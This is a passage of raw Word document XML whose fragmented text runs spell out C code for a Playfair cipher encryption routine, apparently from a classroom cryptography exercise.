          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>()</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nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>=1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>ps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze=s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518" w:right="1711" w:hanging="708"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(ps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e%2!=0)   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>chara</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er X s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nce p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s odd </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,"X");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>e)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>searchMa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(row</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">==row2)  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>row p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1518"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1240" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="1" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="-56"/>
      </w:pPr>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e cha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]==p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">])    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>wo 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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">refer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[row1][(c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>1+1)%5];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="708"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1240" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="1531" w:space="697"/>
            <w:col w:w="7292"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>]='$';</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:right="257"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:right="257"/>
        <w:jc w:val="right"/>
      </w:pP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right="257"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1480" w:right="929"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>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3" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[row1][(c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>1+1)%5];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1240" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="2601" w:space="335"/>
            <w:col w:w="6584"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[row2][(c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>2+1)%5];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>1==co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">2)  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
